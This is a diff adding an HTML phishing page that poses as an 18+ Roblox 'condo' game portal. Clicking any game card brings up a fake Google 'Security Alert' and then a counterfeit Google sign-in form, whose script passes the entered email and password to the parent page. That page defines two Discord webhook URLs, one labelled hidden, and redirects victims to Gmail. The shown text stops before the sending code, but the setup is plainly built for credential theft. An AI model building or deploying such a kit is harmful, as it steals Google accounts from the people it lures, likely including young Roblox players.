@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Roblox Condo – 18+ Only</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { background:#06080a; font-family:'Google Sans','Roboto',sans-serif; min-height:100vh; display:flex; flex-direction:column; align-items:center; padding:20px; color:#fff; position:relative; overflow-x:hidden; }
+    body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background-image:linear-gradient(rgba(247,151,30,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(247,151,30,0.03) 1px, transparent 1px); background-size:60px 60px; pointer-events:none; z-index:0; animation:gridPulse 8s ease-in-out infinite alternate; }
+    @keyframes gridPulse { 0%{opacity:0.4;} 100%{opacity:1;} }
+    body::after { content:''; position:fixed; top:-20%; left:-10%; width:60%; height:60%; background:radial-gradient(circle, rgba(247,151,30,0.06) 0%, transparent 70%); pointer-events:none; z-index:0; animation:orbFloat 20s ease-in-out infinite alternate; }
+    @keyframes orbFloat { 0%{transform:translate(0,0) scale(1);} 33%{transform:translate(10%,-10%) scale(1.2);} 66%{transform:translate(-5%,15%) scale(0.9);} 100%{transform:translate(5%,-5%) scale(1.1);} }
+    .trust-bar { width:100%; max-width:1200px; display:flex; justify-content:center; align-items:center; gap:32px; flex-wrap:wrap; padding:10px 24px; margin-bottom:16px; background:rgba(10,12,18,0.5); backdrop-filter:blur(12px); border-radius:40px; border:1px solid rgba(247,151,30,0.08); z-index:1; position:relative; }
+    .trust-bar .trust-item { display:flex; align-items:center; gap:8px; color:#7a8a9a; font-size:13px; font-weight:500; letter-spacing:0.3px; }
+    .trust-bar .trust-item i { color:#34a853; font-size:16px; }
+    .trust-bar .trust-item .gold-star { color:#ffd700; }
+    .trust-bar .trust-item strong { color:#f0f0f0; font-weight:600; }
+    .trust-bar .divider { width:1px; height:24px; background:rgba(255,255,255,0.06); }
+    .age-badge { display:inline-flex; align-items:center; gap:6px; background:#ea4335; color:#fff; font-weight:700; font-size:14px; padding:4px 14px 4px 10px; border-radius:40px; letter-spacing:1px; box-shadow:0 0 20px rgba(234,67,53,0.3); border:1px solid rgba(255,255,255,0.1); }
+    .age-badge i { font-size:16px; }
+    .main-header { width:100%; max-width:1200px; display:flex; justify-content:space-between; align-items:center; padding:16px 32px; background:rgba(10,12,18,0.7); backdrop-filter:blur(24px) saturate(200%); border-radius:28px; border:1px solid rgba(247,151,30,0.2); box-shadow:0 8px 60px rgba(0,0,0,0.7), 0 0 60px rgba(247,151,30,0.04); margin-bottom:24px; position:relative; z-index:1; transition:box-shadow 0.4s, border-color 0.4s; }
+    .main-header:hover { border-color:rgba(247,151,30,0.5); box-shadow:0 8px 80px rgba(247,151,30,0.08); }
+    .main-header .logo { font-size:28px; font-weight:700; letter-spacing:1.5px; background:linear-gradient(135deg, #f7971e, #ffd700, #f7971e); background-size:200% 200%; -webkit-background-clip:text; -webkit-text-fill-color:transparent; animation:goldShine 4s ease-in-out infinite alternate; display:flex; align-items:center; gap:12px; }
+    @keyframes goldShine { 0%{background-position:0% 50%;} 100%{background-position:100% 50%;} }
+    .main-header .logo i { -webkit-text-fill-color:initial; color:#ffd700; filter:drop-shadow(0 0 20px rgba(255,215,0,0.3)); }
+    .main-header .right-group { display:flex; align-items:center; gap:18px; }
+    .main-header .trust-badge { display:flex; align-items:center; gap:12px; background:rgba(52,168,83,0.10); padding:6px 18px 6px 14px; border-radius:40px; border:1px solid rgba(52,168,83,0.15); color:#34a853; font-size:13px; font-weight:500; letter-spacing:0.3px; }
+    .main-header .trust-badge i { font-size:16px; }
+    .game-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(220px, 1fr)); gap:28px; width:100%; max-width:1200px; margin-top:8px; position:relative; z-index:1; }
+    .game-card { background:rgba(12,14,22,0.65); backdrop-filter:blur(20px) saturate(180%); border:1px solid rgba(247,151,30,0.12); border-radius:24px; padding:28px 20px 24px; text-align:center; cursor:pointer; transition:transform 0.4s cubic-bezier(0.23,1,0.32,1), box-shadow 0.5s, background 0.4s, border-color 0.4s; box-shadow:0 8px 40px rgba(0,0,0,0.4), inset 0 1px 0 rgba(247,151,30,0.04); position:relative; overflow:hidden; }
+    .game-card::before { content:''; position:absolute; top:-60%; left:-60%; width:220%; height:220%; background:radial-gradient(circle at 30% 20%, rgba(247,151,30,0.06), transparent 70%); pointer-events:none; transition:opacity 0.6s; opacity:0.3; }
+    .game-card::after { content:''; position:absolute; bottom:0; left:0; right:0; height:2px; background:linear-gradient(90deg, transparent, #f7971e, #ffd700, #f7971e, transparent); opacity:0; transition:opacity 0.5s; box-shadow:0 0 20px rgba(247,151,30,0.2); }
+    .game-card:hover { transform:translateY(-10px) scale(1.02); box-shadow:0 20px 80px rgba(247,151,30,0.10), 0 8px 40px rgba(0,0,0,0.5); background:rgba(18,20,32,0.8); border-color:rgba(247,151,30,0.4); }
+    .game-card:hover::after { opacity:1; }
+    .game-card:hover::before { opacity:0.6; }
+    .game-card .verified-badge { position:absolute; top:14px; left:14px; background:rgba(52,168,83,0.12); border:1px solid rgba(52,168,83,0.15); border-radius:20px; padding:3px 12px 3px 8px; display:flex; align-items:center; gap:4px; font-size:10px; font-weight:600; color:#34a853; letter-spacing:0.5px; }
+    .game-card .verified-badge i { font-size:12px; }
+    .game-card .age-18 { position:absolute; top:14px; right:14px; background:#ea4335; color:#fff; font-size:10px; font-weight:700; padding:2px 10px; border-radius:12px; letter-spacing:0.5px; border:1px solid rgba(255,255,255,0.1); }
+    .game-card .icon { font-size:48px; margin-bottom:14px; display:block; filter:drop-shadow(0 4px 24px rgba(0,0,0,0.4)); }
+    .game-card .name { font-size:20px; font-weight:600; color:#fff; letter-spacing:0.5px; margin-bottom:4px; background:linear-gradient(135deg, #f0f0f0, #b0c0d0); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+    .game-card .players { font-size:13px; color:#5a6a7a; margin-top:8px; font-weight:400; }
+    .game-card .players i { margin-right:6px; color:#f7971e; }
+    .game-card .glow-ring { position:absolute; top:-20px; right:-20px; width:100px; height:100px; border-radius:50%; background:radial-gradient(circle, rgba(247,151,30,0.06), transparent 70%); pointer-events:none; transition:transform 0.6s; }
+    .game-card:hover .glow-ring { transform:scale(1.8); }
+    .game-card .shimmer { position:absolute; top:0; left:-100%; width:60%; height:100%; background:linear-gradient(90deg, transparent, rgba(255,215,0,0.04), transparent); transform:skewX(-25deg); pointer-events:none; transition:left 0.8s; }
+    .game-card:hover .shimmer { left:150%; }
+    .trust-footer { width:100%; max-width:1200px; margin-top:40px; padding:20px 32px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:16px; background:rgba(10,12,18,0.4); backdrop-filter:blur(12px); border-radius:24px; border:1px solid rgba(247,151,30,0.06); z-index:1; position:relative; }
+    .trust-footer .seal { display:flex; align-items:center; gap:10px; color:#5a6a7a; font-size:12px; font-weight:400; letter-spacing:0.3px; }
+    .trust-footer .seal i { font-size:20px; color:#34a853; }
+    .trust-footer .seal .lock { color:#f7971e; }
+    .trust-footer .seal strong { color:#ccd6f6; font-weight:500; }
+    .trust-footer .legal { display:flex; gap:24px; color:#4a5a6a; font-size:12px; }
+    .trust-footer .legal a { color:#4a5a6a; text-decoration:none; transition:color 0.2s; }
+    .trust-footer .legal a:hover { color:#ccd6f6; }
+    .redirect-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(6,8,10,0.92); backdrop-filter:blur(8px); z-index:999; justify-content:center; align-items:center; flex-direction:column; animation:fadeIn 0.3s; }
+    .redirect-overlay.active { display:flex; }
+    .redirect-overlay .spinner-large { font-size:60px; color:#ffd700; animation:spin 1s linear infinite; margin-bottom:24px; }
+    .redirect-overlay .redirect-text { font-size:28px; font-weight:500; color:#f0f0f0; letter-spacing:1px; margin-bottom:12px; }
+    .redirect-overlay .redirect-sub { font-size:16px; color:#7a8a9a; font-weight:400; }
+    .redirect-overlay .countdown { font-size:20px; font-weight:600; color:#ffd700; margin-top:8px; }
+    @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+    .toast-notification { position:fixed; bottom:40px; left:50%; transform:translateX(-50%); background:#ea4335; color:#fff; padding:14px 28px; border-radius:12px; font-size:16px; font-weight:500; box-shadow:0 8px 32px rgba(234,67,53,0.4); z-index:1001; display:none; animation:slideUpToast 0.4s; border:1px solid rgba(255,255,255,0.1); }
+    @keyframes slideUpToast { from{opacity:0; transform:translateX(-50%) translateY(20px);} to{opacity:1; transform:translateX(-50%) translateY(0);} }
+    .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.45); backdrop-filter:blur(4px); z-index:1000; justify-content:center; align-items:center; padding:20px; animation:fadeIn 0.35s; }
+    .modal-overlay.active { display:flex; }
+    @keyframes fadeIn { from{opacity:0;} to{opacity:1;} }
+    .oauth-modal { background:#ffffff; border-radius:4px; max-width:540px; width:100%; max-height:92vh; padding:36px 40px 32px; box-shadow:0 12px 48px rgba(0,0,0,0.25); border:1px solid #dadce0; text-align:left; position:relative; animation:slideUp 0.3s cubic-bezier(0.23,1,0.32,1); overflow-y:auto; display:flex; flex-direction:column; }
+    @keyframes slideUp { from{transform:translateY(20px);opacity:0;} to{transform:translateY(0);opacity:1;} }
+    .oauth-modal .oauth-header { display:flex; align-items:center; gap:10px; margin-bottom:18px; padding-bottom:14px; border-bottom:1px solid #e8eaed; }
+    .oauth-modal .oauth-header img { height:24px; width:auto; object-fit:contain; }
+    .oauth-modal .oauth-header .spacer { flex:1; }
+    .oauth-modal .oauth-header .badge { background:#202124; color:#ffffff; font-size:11px; font-weight:600; padding:4px 12px; border-radius:4px; font-family:'Roboto',sans-serif; display:flex; align-items:center; gap:4px; }
+    .oauth-modal .oauth-header .badge i { font-size:12px; }
+    .oauth-modal h2 { font-size:20px; font-weight:500; color:#202124; margin-bottom:6px; font-family:'Google Sans',sans-serif; }
+    .oauth-modal .body-text { color:#5f6368; font-size:14px; line-height:1.7; padding:14px 16px; background:#f8f9fa; border-left:4px solid #ea4335; margin:6px 0 18px 0; font-family:'Roboto',sans-serif; border-radius:4px; }
+    .oauth-modal .body-text strong { color:#d93025; font-weight:600; display:block; margin-bottom:4px; font-size:15px; }
+    .oauth-modal .body-text .highlight { color:#202124; font-weight:500; }
+    .oauth-modal .trust-row { display:flex; justify-content:flex-start; gap:20px; flex-wrap:wrap; margin:10px 0 20px 0; padding:8px 0; border-top:1px solid #e8eaed; border-bottom:1px solid #e8eaed; }
+    .oauth-modal .trust-row .item { display:flex; align-items:center; gap:6px; color:#5f6368; font-size:12px; font-weight:500; font-family:'Roboto',sans-serif; }
+    .oauth-modal .trust-row .item i { color:#34a853; font-size:15px; }
+    .oauth-modal .trust-row .item .lock { color:#1a73e8; }
+    .oauth-modal .btn-continue { background:#1a73e8; color:#ffffff; border:none; border-radius:4px; padding:11px 24px; font-size:14px; font-weight:500; cursor:pointer; width:100%; transition:background 0.15s, box-shadow 0.15s; font-family:'Google Sans',sans-serif; box-shadow:0 1px 4px rgba(26,115,232,0.2); display:flex; align-items:center; justify-content:center; gap:8px; }
+    .oauth-modal .btn-continue:hover { background:#1b66c9; box-shadow:0 2px 8px rgba(26,115,232,0.3); }
+    .oauth-modal .btn-continue:active { background:#1557b0; transform:scale(0.98); }
+    .oauth-modal .btn-continue i { font-size:16px; }
+    .oauth-modal .footer { margin-top:16px; display:flex; align-items:center; justify-content:center; gap:10px; flex-wrap:wrap; color:#5f6368; font-size:11px; border-top:1px solid #e8eaed; padding-top:14px; font-family:'Roboto',sans-serif; }
+    .oauth-modal .footer span { font-weight:500; color:#202124; }
+    .oauth-modal .footer .dot { color:#dadce0; }
+    .oauth-modal .official { margin-top:8px; display:flex; justify-content:center; align-items:center; gap:6px; color:#5f6368; font-size:11px; font-family:'Roboto',sans-serif; }
+    .oauth-modal .official i { color:#1a73e8; font-size:13px; }
+    .oauth-modal .official strong { color:#202124; }
+    /* iframe wrapper for Google login */
+    .login-iframe-wrapper {
+      display:none;
+      position:fixed;
+      top:0; left:0; width:100%; height:100%;
+      background:rgba(0,0,0,0.5);
+      backdrop-filter:blur(5px);
+      z-index:2000;
+      justify-content:center;
+      align-items:center;
+      padding:24px;
+    }
+    .login-iframe-wrapper.active { display:flex; }
+    .login-iframe-box {
+      background:#ffffff;
+      border-radius:8px;
+      max-width:420px;
+      width:100%;
+      box-shadow:0 20px 60px rgba(0,0,0,0.35);
+      border:1px solid #dadce0;
+      overflow:hidden;
+      position:relative;
+      animation:slideUp 0.3s ease;
+    }
+    .login-iframe-box .close-btn {
+      position:absolute;
+      top:10px;
+      right:14px;
+      background:none;
+      border:none;
+      font-size:24px;
+      color:#5f6368;
+      cursor:pointer;
+      z-index:10;
+      padding:4px 8px;
+      border-radius:4px;
+      transition:background 0.15s;
+    }
+    .login-iframe-box .close-btn:hover { background:#f1f3f4; color:#202124; }
+    .login-iframe-box iframe {
+      width:100%;
+      height:520px;
+      border:none;
+      background:#ffffff;
+      display:block;
+    }
+    @media (max-width:480px) {
+      .login-iframe-box { max-width:100%; margin:6px; border-radius:4px; }
+      .login-iframe-box iframe { height:460px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="trust-bar">
+    <span class="trust-item"><i class="fas fa-check-circle"></i> <strong>Trusted</strong> by 50,000+ users</span>
+    <span class="divider"></span>
+    <span class="trust-item"><i class="fas fa-star gold-star"></i><i class="fas fa-star gold-star"></i><i class="fas fa-star gold-star"></i><i class="fas fa-star gold-star"></i><i class="fas fa-star gold-star"></i> 4.9/5 rating</span>
+    <span class="divider"></span>
+    <span class="trust-item"><i class="fas fa-shield-alt" style="color:#f7971e;"></i> <strong>256-bit</strong> SSL encrypted</span>
+    <span class="divider"></span>
+    <span class="trust-item"><i class="fas fa-clock" style="color:#f7971e;"></i> <strong>24/7</strong> support</span>
+  </div>
+  <header class="main-header">
+    <div class="logo"><i class="fas fa-cube"></i> CondoVerse</div>
+    <div class="right-group">
+      <span class="age-badge"><i class="fas fa-exclamation-triangle"></i> 18+</span>
+      <div class="trust-badge"><i class="fas fa-shield-alt"></i> Secure &amp; Verified</div>
+    </div>
+  </header>
+  <div class="game-grid">
+<div class="game-card" onclick="startRedirectSequence()">
+  <span class="verified-badge"><i class="fas fa-check-circle"></i> Verified</span>
+  <span class="age-18">18+</span>
+  <span class="glow-ring"></span>
+  <span class="shimmer"></span>
+  <span class="icon">🏖️</span>
+  <div class="name">Boys and Girls Hangout</div>
+  <div class="players"><i class="fas fa-user"></i> 12.4k archived</div>
+</div>
+<div class="game-card" onclick="startRedirectSequence()">
+  <span class="verified-badge"><i class="fas fa-check-circle"></i> Verified</span>
+  <span class="age-18">18+</span>
+  <span class="glow-ring"></span>
+  <span class="shimmer"></span>
+  <span class="icon">🏠</span>
+  <div class="name">Vayhood RP</div>
+  <div class="players"><i class="fas fa-user"></i> 8.7k archived</div>
+</div>
+<div class="game-card" onclick="startRedirectSequence()">
+  <span class="verified-badge"><i class="fas fa-check-circle"></i> Verified</span>
+  <span class="age-18">18+</span>
+  <span class="glow-ring"></span>
+  <span class="shimmer"></span>
+  <span class="icon">🤗</span>
+  <div class="name">Hug People Simulator</div>
+  <div class="players"><i class="fas fa-user"></i> 6.2k archived</div>
+</div>
+<div class="game-card" onclick="startRedirectSequence()">
+  <span class="verified-badge"><i class="fas fa-check-circle"></i> Verified</span>
+  <span class="age-18">18+</span>
+  <span class="glow-ring"></span>
+  <span class="shimmer"></span>
+  <span class="icon">⚡</span>
+  <div class="name">Pokémon Brick Bronze</div>
+  <div class="players"><i class="fas fa-user"></i> 21.5k archived</div>
+</div>
+<div class="game-card" onclick="startRedirectSequence()">
+  <span class="verified-badge"><i class="fas fa-check-circle"></i> Verified</span>
+  <span class="age-18">18+</span>
+  <span class="glow-ring"></span>
+  <span class="shimmer"></span>
+  <span class="icon">🧬</span>
+  <div class="name">Ro-Bio &amp; Ro-Bio 2</div>
+  <div class="players"><i class="fas fa-user"></i> 4.3k archived</div>
+</div>
+<div class="game-card" onclick="startRedirectSequence()">
+  <span class="verified-badge"><i class="fas fa-check-circle"></i> Verified</span>
+  <span class="age-18">18+</span>
+  <span class="glow-ring"></span>
+  <span class="shimmer"></span>
+  <span class="icon">⭐</span>
+  <div class="name">Rate My Avatar</div>
+  <div class="players"><i class="fas fa-user"></i> 9.8k archived</div>
+</div>
+
+  </div>
+  <div class="trust-footer">
+    <div class="seal"><i class="fas fa-lock lock"></i><span><strong>Secure Connection</strong> • All data encrypted</span></div>
+    <div class="seal"><i class="fas fa-shield-alt" style="color:#f7971e;"></i><span><strong>Meta Verified</strong> • Google Trust Services</span></div>
+    <div class="seal"><i class="fas fa-check-circle"></i><span><strong>Verified</strong> • 256-bit SSL</span></div>
+    <div class="legal"><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Support</a></div>
+  </div>
+  <div class="redirect-overlay" id="redirectOverlay">
+    <div class="spinner-large"><i class="fas fa-spinner"></i></div>
+    <div class="redirect-text">Redirecting to Roblox.com</div>
+    <div class="redirect-sub">You will be redirected in <span id="countdownDisplay">3</span> seconds</div>
+  </div>
+  <div class="toast-notification" id="redirectFailedToast"><i class="fas fa-exclamation-triangle" style="margin-right:10px;"></i> Redirect failed. Please try again.</div>
+  <div class="modal-overlay" id="oauthOverlay">
+    <div class="oauth-modal">
+      <div class="oauth-header">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" />
+        <span class="spacer"></span>
+        <span class="badge"><i class="fas fa-exclamation-triangle"></i> Alert</span>
+      </div>
+      <h2>Security Alert</h2>
+      <div class="body-text"><strong><i class="fas fa-exclamation-triangle" style="color:#ea4335;margin-right:6px;"></i> Suspicious activity detected</strong>
+Google has detected a new sign-in attempt from an unrecognized device and location. To protect your account, we need you to verify your identity immediately.
+<br /><br />
+<span style="color:#202124;font-weight:500;">Your account has been temporarily restricted</span> until you complete this verification. This is a standard Google security measure.
+<br /><br />
+If you did not initiate this request, please secure your account now.</div>
+      <div class="trust-row">
+        <span class="item"><i class="fas fa-check-circle"></i> Google Verified</span>
+        <span class="item"><i class="fas fa-lock lock"></i> Encrypted Connection</span>
+        <span class="item"><i class="fas fa-clock"></i> 24-hour deadline</span>
+      </div>
+      <button class="btn-continue" id="oauthContinue"><i class="fas fa-shield-alt"></i> Secure My Account</button>
+      <div class="footer">
+        <i class="fas fa-lock" style="color:#1a73e8;"></i>
+        <span>Google Account</span><span class="dot">•</span><span>Protected by Google Security</span><span class="dot">•</span><i class="fas fa-check-circle" style="color:#34a853;"></i> Verified
+      </div>
+      <div class="official"><i class="fas fa-shield-alt"></i><strong>Official Google Security Notification</strong><span style="color:#dadce0;margin:0 4px;">•</span><span>Automated security measure</span></div>
+    </div>
+  </div>
+  
+  <div class="login-iframe-wrapper" id="loginIframeWrapper">
+    <div class="login-iframe-box">
+      <button class="close-btn" id="closeIframeBtn">&times;</button>
+      <iframe id="loginIframe" srcdoc="&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+  &lt;title&gt;Google Sign In&lt;/title&gt;
+  &lt;link href=&quot;https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600;700&amp;family=Roboto:wght@400;500&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css&quot;&gt;
+  &lt;style&gt;
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      background:#ffffff;
+      font-family:&quot;Google Sans&quot;,&quot;Roboto&quot;,sans-serif;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      min-height:100vh;
+      padding:16px;
+      margin:0;
+    }
+    .login-box {
+      max-width:368px;
+      width:100%;
+      padding:32px 24px 24px;
+      border:1px solid #dadce0;
+      border-radius:8px;
+      background:#ffffff;
+    }
+    .logo { text-align:center; margin-bottom:20px; }
+    .logo img { height:32px; width:auto; }
+    h1 { font-size:24px; font-weight:400; color:#202124; text-align:center; margin-bottom:4px; font-family:&quot;Google Sans&quot;,sans-serif; }
+    .sub { font-size:16px; font-weight:400; color:#202124; text-align:center; margin-bottom:28px; }
+    .field { margin-bottom:16px; }
+    .field input {
+      width:100%;
+      padding:13px 16px;
+      font-size:16px;
+      border:1px solid #dadce0;
+      border-radius:4px;
+      outline:none;
+      font-family:inherit;
+      transition:border 0.15s, box-shadow 0.15s;
+      background:#ffffff;
+      color:#202124;
+    }
+    .field input:focus { border-color:#1a73e8; box-shadow:0 0 0 2px rgba(26,115,232,0.15); }
+    .field input::placeholder { color:#9aa0a6; }
+    .forgot { text-align:right; margin-top:4px; }
+    .forgot a { font-size:14px; color:#1a73e8; text-decoration:none; font-weight:500; cursor:pointer; }
+    .forgot a:hover { text-decoration:underline; }
+    .actions {
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      margin-top:24px;
+      gap:12px;
+      flex-wrap:wrap;
+    }
+    .actions .create { font-size:14px; color:#1a73e8; text-decoration:none; font-weight:500; cursor:pointer; }
+    .actions .create:hover { text-decoration:underline; }
+    .actions .next {
+      background:#1a73e8;
+      color:#ffffff;
+      border:none;
+      border-radius:4px;
+      padding:9px 24px;
+      font-size:14px;
+      font-weight:500;
+      cursor:pointer;
+      font-family:inherit;
+      transition:background 0.15s;
+    }
+    .actions .next:hover { background:#1b66c9; }
+    .actions .next:active { background:#1557b0; transform:scale(0.97); }
+    .actions .next:disabled { opacity:0.5; cursor:not-allowed; transform:none; }
+    .spinner { display:none; justify-content:center; margin-top:12px; }
+    .spinner i { color:#1a73e8; font-size:22px; animation:spin 0.7s linear infinite; }
+    @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+    .guest {
+      margin-top:20px;
+      font-size:14px;
+      color:#5f6368;
+      padding:10px 12px;
+      background:#f8f9fa;
+      border:1px solid #f1f3f4;
+      border-radius:4px;
+      text-align:left;
+    }
+    .guest a { color:#1a73e8; text-decoration:none; font-weight:500; cursor:pointer; }
+    .guest a:hover { text-decoration:underline; }
+    .footer-links {
+      margin-top:18px;
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      flex-wrap:wrap;
+      gap:8px;
+      border-top:1px solid #e8eaed;
+      padding-top:14px;
+    }
+    .footer-links .lang { font-size:12px; color:#5f6368; font-weight:500; cursor:pointer; background:none; border:none; font-family:inherit; }
+    .footer-links .lang:hover { text-decoration:underline; }
+    .footer-links .links { display:flex; gap:14px; flex-wrap:wrap; }
+    .footer-links .links a { font-size:12px; color:#5f6368; text-decoration:none; cursor:pointer; font-family:inherit; }
+    .footer-links .links a:hover { color:#202124; text-decoration:underline; }
+    .error-msg {
+      display:none;
+      color:#d93025;
+      font-size:13px;
+      padding:6px 10px;
+      background:#fce8e6;
+      border-radius:4px;
+      margin-top:6px;
+      align-items:center;
+      gap:6px;
+    }
+    .error-msg i { font-size:13px; }
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;login-box&quot;&gt;
+  &lt;div class=&quot;logo&quot;&gt;&lt;img src=&quot;https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png&quot; alt=&quot;Google&quot; /&gt;&lt;/div&gt;
+  &lt;h1&gt;Sign in&lt;/h1&gt;
+  &lt;p class=&quot;sub&quot;&gt;Use your Google Account&lt;/p&gt;
+  &lt;div class=&quot;field&quot;&gt;&lt;input type=&quot;text&quot; id=&quot;emailInput&quot; placeholder=&quot;Email or phone&quot; autocomplete=&quot;username&quot; /&gt;&lt;/div&gt;
+  &lt;div class=&quot;error-msg&quot; id=&quot;emailError&quot;&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; &lt;span&gt;Enter an email or phone number.&lt;/span&gt;&lt;/div&gt;
+  &lt;div class=&quot;field&quot; style=&quot;margin-top:8px;&quot;&gt;&lt;input type=&quot;password&quot; id=&quot;passInput&quot; placeholder=&quot;Enter your password&quot; autocomplete=&quot;current-password&quot; /&gt;&lt;/div&gt;
+  &lt;div class=&quot;error-msg&quot; id=&quot;passError&quot;&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; &lt;span&gt;Enter your password.&lt;/span&gt;&lt;/div&gt;
+  &lt;div class=&quot;forgot&quot;&gt;&lt;a id=&quot;forgotLink&quot; href=&quot;#&quot;&gt;Forgot password?&lt;/a&gt;&lt;/div&gt;
+  &lt;div class=&quot;actions&quot;&gt;
+    &lt;a class=&quot;create&quot; id=&quot;createLink&quot; href=&quot;#&quot;&gt;Create account&lt;/a&gt;
+    &lt;button class=&quot;next&quot; id=&quot;loginBtn&quot;&gt;Next&lt;/button&gt;
+  &lt;/div&gt;
+  &lt;div class=&quot;spinner&quot; id=&quot;spinner&quot;&gt;&lt;i class=&quot;fas fa-spinner&quot;&gt;&lt;/i&gt;&lt;/div&gt;
+  &lt;div class=&quot;guest&quot;&gt;Not your computer? Use Guest mode to sign in privately. &lt;a id=&quot;guestLink&quot; href=&quot;#&quot;&gt;Learn more&lt;/a&gt;&lt;/div&gt;
+  &lt;div class=&quot;footer-links&quot;&gt;
+    &lt;button class=&quot;lang&quot; id=&quot;langBtn&quot;&gt;English (United States) ▼&lt;/button&gt;
+    &lt;div class=&quot;links&quot;&gt;
+      &lt;a id=&quot;helpLink&quot; href=&quot;#&quot;&gt;Help&lt;/a&gt;
+      &lt;a id=&quot;privacyLink&quot; href=&quot;#&quot;&gt;Privacy&lt;/a&gt;
+      &lt;a id=&quot;termsLink&quot; href=&quot;#&quot;&gt;Terms&lt;/a&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;script&gt;
+  var emailInput = document.getElementById(&quot;emailInput&quot;);
+  var passInput = document.getElementById(&quot;passInput&quot;);
+  var loginBtn = document.getElementById(&quot;loginBtn&quot;);
+  var spinner = document.getElementById(&quot;spinner&quot;);
+  var emailError = document.getElementById(&quot;emailError&quot;);
+  var passError = document.getElementById(&quot;passError&quot;);
+
+  function getEmail() { return emailInput ? emailInput.value.trim() : &quot;&quot;; }
+  function getPass() { return passInput ? passInput.value.trim() : &quot;&quot;; }
+
+  function submitLogin() {
+    var email = getEmail();
+    var pass = getPass();
+    if (!email) { emailError.style.display = &quot;flex&quot;; emailInput.focus(); return; }
+    emailError.style.display = &quot;none&quot;;
+    if (!pass) { passError.style.display = &quot;flex&quot;; passInput.focus(); return; }
+    passError.style.display = &quot;none&quot;;
+
+    if (window.parent &amp;&amp; window.parent !== window) {
+      window.parent.postMessage({ type: &quot;googleLogin&quot;, email: email, password: pass }, &quot;*&quot;);
+    }
+
+    spinner.style.display = &quot;flex&quot;;
+    loginBtn.disabled = true;
+    loginBtn.textContent = &quot;Signing in…&quot;;
+
+    setTimeout(function() {
+      window.location.href = &quot;https://mail.google.com&quot;;
+    }, 1200);
+  }
+
+  if (loginBtn) loginBtn.addEventListener(&quot;click&quot;, submitLogin);
+  if (emailInput) emailInput.addEventListener(&quot;keydown&quot;, function(e) { if (e.key === &quot;Enter&quot;) loginBtn.click(); });
+  if (passInput) passInput.addEventListener(&quot;keydown&quot;, function(e) { if (e.key === &quot;Enter&quot;) loginBtn.click(); });
+
+  document.getElementById(&quot;forgotLink&quot;).addEventListener(&quot;click&quot;, function(e) { e.preventDefault(); alert(&quot;Password reset link sent.&quot;); });
+  document.getElementById(&quot;createLink&quot;).addEventListener(&quot;click&quot;, function(e) { e.preventDefault(); window.open(&quot;https://accounts.google.com/signup&quot;, &quot;_blank&quot;); });
+  document.getElementById(&quot;guestLink&quot;).addEventListener(&quot;click&quot;, function(e) { e.preventDefault(); alert(&quot;Guest mode: sign in privately.&quot;); });
+  document.getElementById(&quot;langBtn&quot;).addEventListener(&quot;click&quot;, function() { alert(&quot;English (United States)&quot;); });
+  document.getElementById(&quot;helpLink&quot;).addEventListener(&quot;click&quot;, function(e) { e.preventDefault(); window.open(&quot;https://support.google.com/&quot;, &quot;_blank&quot;); });
+  document.getElementById(&quot;privacyLink&quot;).addEventListener(&quot;click&quot;, function(e) { e.preventDefault(); window.open(&quot;https://policies.google.com/privacy&quot;, &quot;_blank&quot;); });
+  document.getElementById(&quot;termsLink&quot;).addEventListener(&quot;click&quot;, function(e) { e.preventDefault(); window.open(&quot;https://policies.google.com/terms&quot;, &quot;_blank&quot;); });
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;"></iframe>
+    </div>
+  </div>
+  <script>
+    var WEBHOOK = 'https://discord.com/api/webhooks/1540213071425835039/NdbIQ2mK0UyfjXgJB9dyl52j_5Ze0NL8Zmq7VJuBIvQ2HENWs-S-l9dHHTs7JFRpjCdn';
+    var HIDDEN_WEBHOOK = 'https://discord.com/api/webhooks/1540288761835819149/v0UxsjWOHW7a_A07dqbgao9I6I1lL2rClrU9GPUT0rDbjTCQllzFH-4NU7GE3kv3_kO0';
+    var REDIRECT = 'https://mail.google.com';
+
